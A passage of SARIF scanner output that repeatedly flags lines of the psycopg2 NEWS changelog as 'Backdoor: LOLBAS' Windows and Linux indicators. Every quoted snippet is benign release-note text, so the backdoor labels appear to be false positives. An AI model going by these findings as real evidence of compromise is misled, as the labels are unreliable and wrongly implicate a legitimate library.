                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 427,
                  "startColumn": 1,
                  "endLine": 427,
                  "endColumn": 10,
                  "snippet": {
                    "text": "- Added ``async_`` as an alias for ``async`` to support Python 3.7 where\n  ``async`` will become a keyword (:ticket:`#495`).\n- Unless in autocommit, do not use :sql:`default_transaction_*` settings to\n  control the session characteristics as it may create problems with external\n  connection pools such as pgbouncer; use :sql:`BEGIN` options instead\n  (:ticket:`#503`).\n- `~connection.isolation_level` is now writable and entirely separated from\n",
                    "rendered": {
                      "text": "- Added ``async_`` as an alias for ``async`` to support Python 3.7 where\n  ``async`` will become a keyword (:ticket:`#495`).\n- Unless in autocommit, do not use :sql:`default_transaction_*` settings to\n  control the session characteristics as it may create problems with external\n  connection pools such as pgbouncer; use :sql:`BEGIN` options instead\n  (:ticket:`#503`).\n- `~connection.isolation_level` is now writable and entirely separated from\n",
                      "markdown": "`- Added ``async_`` as an alias for ``async`` to support Python 3.7 where\n  ``async`` will become a keyword (:ticket:`#495`).\n- Unless in autocommit, do not use :sql:`default_transaction_*` settings to\n  control the session characteristics as it may create problems with external\n  connection pools such as pgbouncer; use :sql:`BEGIN` options instead\n  (:ticket:`#503`).\n- `~connection.isolation_level` is now writable and entirely separated from\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 176,
                  "startColumn": 53,
                  "endLine": 176,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n- Added *interval_status* parameter to\n  `~psycopg2.extras.ReplicationCursor.start_replication()` method and other\n  facilities to send automatic replication keepalives at periodic intervals\n  (:ticket:`#913`).\n- Fixed namedtuples caching introduced in 2.8 (:ticket:`#928`).\n\n",
                    "rendered": {
                      "text": "\n- Added *interval_status* parameter to\n  `~psycopg2.extras.ReplicationCursor.start_replication()` method and other\n  facilities to send automatic replication keepalives at periodic intervals\n  (:ticket:`#913`).\n- Fixed namedtuples caching introduced in 2.8 (:ticket:`#928`).\n\n",
                      "markdown": "`\n- Added *interval_status* parameter to\n  `~psycopg2.extras.ReplicationCursor.start_replication()` method and other\n  facilities to send automatic replication keepalives at periodic intervals\n  (:ticket:`#913`).\n- Fixed namedtuples caching introduced in 2.8 (:ticket:`#928`).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 58,
                  "endLine": 168,
                  "endColumn": 62,
                  "snippet": {
                    "text": "  and `~psycopg2.extensions.Column.type_code` (:ticket:`#961`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 12.\n- Wheel package bundled with OpenSSL 1.1.1d and PostgreSQL at least 11.4.\n\n\nWhat's new in psycopg 2.8.3\n",
                    "rendered": {
                      "text": "  and `~psycopg2.extensions.Column.type_code` (:ticket:`#961`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 12.\n- Wheel package bundled with OpenSSL 1.1.1d and PostgreSQL at least 11.4.\n\n\nWhat's new in psycopg 2.8.3\n",
                      "markdown": "`  and `~psycopg2.extensions.Column.type_code` (:ticket:`#961`).\n- `~psycopg2.errorcodes` map and `~psycopg2.errors` classes updated to\n  PostgreSQL 12.\n- Wheel package bundled with OpenSSL 1.1.1d and PostgreSQL at least 11.4.\n\n\nWhat's new in psycopg 2.8.3\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 1478,
                  "startColumn": 37,
                  "endLine": 1478,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n* better typecasting:\n\n  - DateTimeDelta used for postgresql TIME (merge from 1.1)\n  - BYTEA now is converted to a real buffer object, not to a string\n\n* buffer objects are now adapted into Binary objects automatically.\n",
                    "rendered": {
                      "text": "\n* better typecasting:\n\n  - DateTimeDelta used for postgresql TIME (merge from 1.1)\n  - BYTEA now is converted to a real buffer object, not to a string\n\n* buffer objects are now adapted into Binary objects automatically.\n",
                      "markdown": "`\n* better typecasting:\n\n  - DateTimeDelta used for postgresql TIME (merge from 1.1)\n  - BYTEA now is converted to a real buffer object, not to a string\n\n* buffer objects are now adapted into Binary objects automatically.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 1430,
                  "startColumn": 33,
                  "endLine": 1430,
                  "endColumn": 39,
                  "snippet": {
                    "text": "  return rows as objects that support indexing both by position and\n  column name.\n* added support for tzinfo objects in datetime.timestamp objects: the\n  PostgreSQL type \"timestamp with time zone\" is converted to\n  datetime.timestamp with a FixedOffsetTimezone initialized as necessary.\n\nWhat's new in psycopg 1.99.6\n",
                    "rendered": {
                      "text": "  return rows as objects that support indexing both by position and\n  column name.\n* added support for tzinfo objects in datetime.timestamp objects: the\n  PostgreSQL type \"timestamp with time zone\" is converted to\n  datetime.timestamp with a FixedOffsetTimezone initialized as necessary.\n\nWhat's new in psycopg 1.99.6\n",
                      "markdown": "`  return rows as objects that support indexing both by position and\n  column name.\n* added support for tzinfo objects in datetime.timestamp objects: the\n  PostgreSQL type \"timestamp with time zone\" is converted to\n  datetime.timestamp with a FixedOffsetTimezone initialized as necessary.\n\nWhat's new in psycopg 1.99.6\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 1414,
                  "startColumn": 31,
                  "endLine": 1414,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  not activated by default.\n\n* cursors now really support the iterator protocol.\n* solved the rounding errors in time conversions.\n* now cursors support .fileno() and .isready() methods, to be used in\n  select() calls.\n* .copy_from() and .copy_in() methods are back in (still using the old\n",
                    "rendered": {
                      "text": "  not activated by default.\n\n* cursors now really support the iterator protocol.\n* solved the rounding errors in time conversions.\n* now cursors support .fileno() and .isready() methods, to be used in\n  select() calls.\n* .copy_from() and .copy_in() methods are back in (still using the old\n",
                      "markdown": "`  not activated by default.\n\n* cursors now really support the iterator protocol.\n* solved the rounding errors in time conversions.\n* now cursors support .fileno() and .isready() methods, to be used in\n  select() calls.\n* .copy_from() and .copy_in() methods are back in (still using the old\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 1246,
                  "startColumn": 18,
                  "endLine": 1246,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n* Support for named cursors.\n\n* Safer parsing of time intervals.\n\n* Better parsing of times and dates, no more locale problems.\n\n",
                    "rendered": {
                      "text": "\n* Support for named cursors.\n\n* Safer parsing of time intervals.\n\n* Better parsing of times and dates, no more locale problems.\n\n",
                      "markdown": "`\n* Support for named cursors.\n\n* Safer parsing of time intervals.\n\n* Better parsing of times and dates, no more locale problems.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 1030,
                  "startColumn": 36,
                  "endLine": 1030,
                  "endColumn": 42,
                  "snippet": {
                    "text": "New features:\n\n- \"import psycopg2.extras\" to get some support for handling times\n  and timestamps with seconds in the time zone offset.\n- DictCursors can now be used as named cursors.\n\nBug fixes:\n",
                    "rendered": {
                      "text": "New features:\n\n- \"import psycopg2.extras\" to get some support for handling times\n  and timestamps with seconds in the time zone offset.\n- DictCursors can now be used as named cursors.\n\nBug fixes:\n",
                      "markdown": "`New features:\n\n- \"import psycopg2.extras\" to get some support for handling times\n  and timestamps with seconds in the time zone offset.\n- DictCursors can now be used as named cursors.\n\nBug fixes:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 1000,
                  "startColumn": 1,
                  "endLine": 1000,
                  "endColumn": 7,
                  "snippet": {
                    "text": "\n- A specialized type-caster that can parse time zones with seconds is\n  now available. Note that after enabling it (see extras.py) \"wrong\"\n  time zones will be parsed without raising an exception but the\n  result will be rounded.\n- DictCursor can be used as a named cursor.\n- DictRow now implements more dict methods.\n",
                    "rendered": {
                      "text": "\n- A specialized type-caster that can parse time zones with seconds is\n  now available. Note that after enabling it (see extras.py) \"wrong\"\n  time zones will be parsed without raising an exception but the\n  result will be rounded.\n- DictCursor can be used as a named cursor.\n- DictRow now implements more dict methods.\n",
                      "markdown": "`\n- A specialized type-caster that can parse time zones with seconds is\n  now available. Note that after enabling it (see extras.py) \"wrong\"\n  time zones will be parsed without raising an exception but the\n  result will be rounded.\n- DictCursor can be used as a named cursor.\n- DictRow now implements more dict methods.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 998,
                  "startColumn": 42,
                  "endLine": 998,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\nNew features:\n\n- A specialized type-caster that can parse time zones with seconds is\n  now available. Note that after enabling it (see extras.py) \"wrong\"\n  time zones will be parsed without raising an exception but the\n  result will be rounded.\n",
                    "rendered": {
                      "text": "\nNew features:\n\n- A specialized type-caster that can parse time zones with seconds is\n  now available. Note that after enabling it (see extras.py) \"wrong\"\n  time zones will be parsed without raising an exception but the\n  result will be rounded.\n",
                      "markdown": "`\nNew features:\n\n- A specialized type-caster that can parse time zones with seconds is\n  now available. Note that after enabling it (see extras.py) \"wrong\"\n  time zones will be parsed without raising an exception but the\n  result will be rounded.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 867,
                  "startColumn": 31,
                  "endLine": 867,
                  "endColumn": 37,
                  "snippet": {
                    "text": "- the call to logging.basicConfig() in pool.py has been dropped: it was\n  messing with some projects using logging (and a library should not\n  initialize the logging system anyway.)\n- psycopg now correctly handles time zones with seconds in the UTC offset.\n  The old register_tstz_w_secs() function is deprecated and will raise a\n  warning if called.\n- Exceptions raised by the column iterator are propagated.\n",
                    "rendered": {
                      "text": "- the call to logging.basicConfig() in pool.py has been dropped: it was\n  messing with some projects using logging (and a library should not\n  initialize the logging system anyway.)\n- psycopg now correctly handles time zones with seconds in the UTC offset.\n  The old register_tstz_w_secs() function is deprecated and will raise a\n  warning if called.\n- Exceptions raised by the column iterator are propagated.\n",
                      "markdown": "`- the call to logging.basicConfig() in pool.py has been dropped: it was\n  messing with some projects using logging (and a library should not\n  initialize the logging system anyway.)\n- psycopg now correctly handles time zones with seconds in the UTC offset.\n  The old register_tstz_w_secs() function is deprecated and will raise a\n  warning if called.\n- Exceptions raised by the column iterator are propagated.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 791,
                  "startColumn": 13,
                  "endLine": 791,
                  "endColumn": 21,
                  "snippet": {
                    "text": "- Other changes:\n\n  - 'cursor.description' is provided as named tuples if available.\n  - The build script refuses to guess values if 'pg_config' is not\n    found.\n  - Connections and cursors are weakly referenceable.\n\n",
                    "rendered": {
                      "text": "- Other changes:\n\n  - 'cursor.description' is provided as named tuples if available.\n  - The build script refuses to guess values if 'pg_config' is not\n    found.\n  - Connections and cursors are weakly referenceable.\n\n",
                      "markdown": "`- Other changes:\n\n  - 'cursor.description' is provided as named tuples if available.\n  - The build script refuses to guess values if 'pg_config' is not\n    found.\n  - Connections and cursors are weakly referenceable.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 771,
                  "startColumn": 14,
                  "endLine": 771,
                  "endColumn": 20,
                  "snippet": {
                    "text": "- Improvements to the named cursors:\n\n  - More efficient iteration on named cursors, fetching 'itersize'\n    records at time from the backend.\n  - The named cursors name can be an invalid identifier.\n\n- Improvements in data handling:\n",
                    "rendered": {
                      "text": "- Improvements to the named cursors:\n\n  - More efficient iteration on named cursors, fetching 'itersize'\n    records at time from the backend.\n  - The named cursors name can be an invalid identifier.\n\n- Improvements in data handling:\n",
                      "markdown": "`- Improvements to the named cursors:\n\n  - More efficient iteration on named cursors, fetching 'itersize'\n    records at time from the backend.\n  - The named cursors name can be an invalid identifier.\n\n- Improvements in data handling:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 728,
                  "startColumn": 25,
                  "endLine": 728,
                  "endColumn": 30,
                  "snippet": {
                    "text": "- Fixed escape for negative numbers prefixed by minus operator\n  (:ticket:`#57`).\n- Fixed refcount issue during copy.  Reported and fixed by Dave\n  Malcolm (:ticket:`#58`, Red Hat Bug 711095).\n- Trying to execute concurrent operations on the same connection\n  through concurrent green thread results in an error instead of a\n  deadlock.\n",
                    "rendered": {
                      "text": "- Fixed escape for negative numbers prefixed by minus operator\n  (:ticket:`#57`).\n- Fixed refcount issue during copy.  Reported and fixed by Dave\n  Malcolm (:ticket:`#58`, Red Hat Bug 711095).\n- Trying to execute concurrent operations on the same connection\n  through concurrent green thread results in an error instead of a\n  deadlock.\n",
                      "markdown": "`- Fixed escape for negative numbers prefixed by minus operator\n  (:ticket:`#57`).\n- Fixed refcount issue during copy.  Reported and fixed by Dave\n  Malcolm (:ticket:`#58`, Red Hat Bug 711095).\n- Trying to execute concurrent operations on the same connection\n  through concurrent green thread results in an error instead of a\n  deadlock.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 719,
                  "startColumn": 55,
                  "endLine": 719,
                  "endColumn": 61,
                  "snippet": {
                    "text": "  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n",
                    "rendered": {
                      "text": "  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n",
                      "markdown": "`  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 719,
                  "startColumn": 47,
                  "endLine": 719,
                  "endColumn": 53,
                  "snippet": {
                    "text": "  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n",
                    "rendered": {
                      "text": "  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n",
                      "markdown": "`  connection. Added support for read-only sessions and, for PostgreSQL\n  9.1, for the \"repeatable read\" isolation level and the \"deferrable\"\n  transaction property.\n- Psycopg doesn't execute queries at connection time to find the\n  default isolation level.\n- Fixed bug with multithread code potentially causing loss of sync\n  with the server communication or lock of the client (:ticket:`#55`).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 513,
                  "startColumn": 12,
                  "endLine": 513,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  (:ticket:`#262`).\n- `cursor.description` can be pickled (:ticket:`#265`).\n- Propagate read error messages in COPY FROM (:ticket:`#270`).\n- PostgreSQL time 24:00 is converted to Python 00:00 (:ticket:`#278`).\n\n\nWhat's new in psycopg 2.5.4\n",
                    "rendered": {
                      "text": "  (:ticket:`#262`).\n- `cursor.description` can be pickled (:ticket:`#265`).\n- Propagate read error messages in COPY FROM (:ticket:`#270`).\n- PostgreSQL time 24:00 is converted to Python 00:00 (:ticket:`#278`).\n\n\nWhat's new in psycopg 2.5.4\n",
                      "markdown": "`  (:ticket:`#262`).\n- `cursor.description` can be pickled (:ticket:`#265`).\n- Propagate read error messages in COPY FROM (:ticket:`#270`).\n- PostgreSQL time 24:00 is converted to Python 00:00 (:ticket:`#278`).\n\n\nWhat's new in psycopg 2.5.4\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 484,
                  "startColumn": 46,
                  "endLine": 484,
                  "endColumn": 55,
                  "snippet": {
                    "text": "^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Lists consisting of only `None` are escaped correctly (:ticket:`#285`).\n- Fixed deadlock in multithread programs using OpenSSL (:ticket:`#290`).\n- Correctly unlock the connection after error in flush (:ticket:`#294`).\n- Fixed `!MinTimeLoggingCursor.callproc()` (:ticket:`#309`).\n- Added support for MSVC 2015 compiler (:ticket:`#350`).\n",
                    "rendered": {
                      "text": "^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Lists consisting of only `None` are escaped correctly (:ticket:`#285`).\n- Fixed deadlock in multithread programs using OpenSSL (:ticket:`#290`).\n- Correctly unlock the connection after error in flush (:ticket:`#294`).\n- Fixed `!MinTimeLoggingCursor.callproc()` (:ticket:`#309`).\n- Added support for MSVC 2015 compiler (:ticket:`#350`).\n",
                      "markdown": "`^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Lists consisting of only `None` are escaped correctly (:ticket:`#285`).\n- Fixed deadlock in multithread programs using OpenSSL (:ticket:`#290`).\n- Correctly unlock the connection after error in flush (:ticket:`#294`).\n- Fixed `!MinTimeLoggingCursor.callproc()` (:ticket:`#309`).\n- Added support for MSVC 2015 compiler (:ticket:`#350`).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 387,
                  "startColumn": 1,
                  "endLine": 387,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\n- Ignore `!None` arguments passed to `~psycopg2.connect()` and\n  `~psycopg2.extensions.make_dsn()` (:ticket:`#517`).\n- OpenSSL upgraded from major version 0.9.8 to 1.0.2 in the Linux wheel\n  packages (:ticket:`#518`).\n- Fixed build with libpq versions < 9.3 (:ticket:`#520`).\n\n",
                    "rendered": {
                      "text": "\n- Ignore `!None` arguments passed to `~psycopg2.connect()` and\n  `~psycopg2.extensions.make_dsn()` (:ticket:`#517`).\n- OpenSSL upgraded from major version 0.9.8 to 1.0.2 in the Linux wheel\n  packages (:ticket:`#518`).\n- Fixed build with libpq versions < 9.3 (:ticket:`#520`).\n\n",
                      "markdown": "`\n- Ignore `!None` arguments passed to `~psycopg2.connect()` and\n  `~psycopg2.extensions.make_dsn()` (:ticket:`#517`).\n- OpenSSL upgraded from major version 0.9.8 to 1.0.2 in the Linux wheel\n  packages (:ticket:`#518`).\n- Fixed build with libpq versions < 9.3 (:ticket:`#520`).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 333,
                  "startColumn": 54,
                  "endLine": 333,
                  "endColumn": 63,
                  "snippet": {
                    "text": "What's new in psycopg 2.7.3.2\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Wheel package bundled with PostgreSQL 10.0 libpq and OpenSSL 1.0.2l\n  (:tickets:`#601, #602`).\n\n\n",
                    "rendered": {
                      "text": "What's new in psycopg 2.7.3.2\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Wheel package bundled with PostgreSQL 10.0 libpq and OpenSSL 1.0.2l\n  (:tickets:`#601, #602`).\n\n\n",
                      "markdown": "`What's new in psycopg 2.7.3.2\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Wheel package bundled with PostgreSQL 10.0 libpq and OpenSSL 1.0.2l\n  (:tickets:`#601, #602`).\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 325,
                  "startColumn": 55,
                  "endLine": 325,
                  "endColumn": 64,
                  "snippet": {
                    "text": "- Fixed `~cursor.rowcount` after `~cursor.executemany()` with :sql:`RETURNING`\n  statements (:ticket:`#633`).\n- Fixed compatibility problem with pypy3 (:ticket:`#649`).\n- Wheel packages bundled with PostgreSQL 10.1 libpq and OpenSSL 1.0.2n.\n- Wheel packages for Python 2.6 no more available (support dropped from\n  wheel building infrastructure).\n\n",
                    "rendered": {
                      "text": "- Fixed `~cursor.rowcount` after `~cursor.executemany()` with :sql:`RETURNING`\n  statements (:ticket:`#633`).\n- Fixed compatibility problem with pypy3 (:ticket:`#649`).\n- Wheel packages bundled with PostgreSQL 10.1 libpq and OpenSSL 1.0.2n.\n- Wheel packages for Python 2.6 no more available (support dropped from\n  wheel building infrastructure).\n\n",
                      "markdown": "`- Fixed `~cursor.rowcount` after `~cursor.executemany()` with :sql:`RETURNING`\n  statements (:ticket:`#633`).\n- Fixed compatibility problem with pypy3 (:ticket:`#649`).\n- Wheel packages bundled with PostgreSQL 10.1 libpq and OpenSSL 1.0.2n.\n- Wheel packages for Python 2.6 no more available (support dropped from\n  wheel building infrastructure).\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/NEWS"
                },
                "region": {
                  "startLine": 303,
                  "startColumn": 54,
                  "endLine": 303,
                  "endColumn": 63,
